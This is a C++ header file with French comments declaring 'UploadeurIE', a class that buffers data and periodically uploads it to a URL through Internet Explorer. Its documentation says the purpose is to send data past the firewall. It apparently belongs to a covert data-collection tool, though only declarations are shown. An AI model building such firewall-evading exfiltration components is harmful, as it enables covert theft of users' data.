/*!
* \file UploadeurIE.h
* Fichier entête de la classe UploadeurIE.
* Contient aussi l'énumération des méthodes d'envoi
* \date 30/10/2008
* \author Xavier Monin
*/

#ifndef _METTREENLIGNEVIAIE_H_
#define _METTREENLIGNEVIAIE_H_

#include "AStockage.h"
#include "AExtension.h"

#include <string>
#include <vector>
#include <atlbase.h>

/*!
* \enum METHODE_ENVOI
* \brief Méthodes de mise en ligne
*/
enum METHODE_ENVOI {METHODE_POST,
					METHODE_GET,
					METHODE_FILE
					};

/*!
* \class UploadeurIE
* \brief Mets en ligne des données via IE.
* Mets en ligne des données via IE (HTTP) par les méthode GET, POST ou FILE.
* Permet d'envoyer des données sans être bloqué par le parefeu (IE doit être débloqué)
* \author Xavier Monin
*/
class UploadeurIE : public AStockage
{
public:
	UploadeurIE(std::string url, METHODE_ENVOI methode=METHODE_GET,
					   std::string element="element", size_t taille=2048);
	~UploadeurIE();

	virtual void envoyerDonnees(const std::string&);
	void envoyerDonneesMaintenant(const std::string& chaine="");
	void envoyerDonneesMaintenant(const ListeChars&);

	//! \brief Efface le buffer.
	inline void effacerBuffer() { vector_buffer.clear(); };

	//! \brief Change la taille du buffer.
	//! \param[in] taille : Nouvelle taille du buffer
	inline void modifierTailleBuffer(size_t taille) { taille_buffer=taille; };

	//! \brief Change la méthode d'envoi.
	//! \param[in] methode : Methode d'envoi
	inline void modifierMethodeEnvoi(METHODE_ENVOI methode) { methode_envoi=methode; };

	//! \brief Change l'URL de destination.
	//! \param[in] url : Nouvelle URL
	inline void modifierURL(std::string url) { if (!url.empty()) string_url=url; };

	//! \brief Modifie le nom de l'élement.
	//! \param[in] element : Nouveau nom de l'élément
	inline void modifierElement(std::string element) { if (!element.empty()) string_element=element; };

	//! \brief Envoi un string en ligne périodiquement.
	//! \param[in] chaine : string à envoyer en ligne
	//! \return Référence sur l'objet courant de la classe UploadeurIE
	inline UploadeurIE & operator << (const std::string chaine) { envoyerDonnees(chaine); return *this; };

private:
	void creerThread();
	static DWORD WINAPI mettreEnLigneBufferAvecThread(LPVOID objet);
	bool mettreEnLigneBufferSansThread();

	bool mettreEnLigneBuffer();

	std::string encoderURL(const std::string);
	void stringVersBSTR(const std::string, BSTR *);
	void stringVersVariantArray(const std::string &, CComVariant&);
	void vectorVersVariantArray(const ListeChars &, CComVariant&);

	// Les attributs sont ci-dessous

	//! Buffer contenant les données avant mise en ligne
	ListeChars vector_buffer;
	//! Copie de vector_buffer juste avant mise en ligne
	ListeChars vector_buffer_envoi;

	//! Au dessus de sa valeur, on met en ligne
	size_t taille_buffer;

	METHODE_ENVOI methode_envoi;
	std::string string_url;
	std::string string_element;

	//! Défini si le thread est lancé ou pas
	bool thread_en_cours;
};

#endif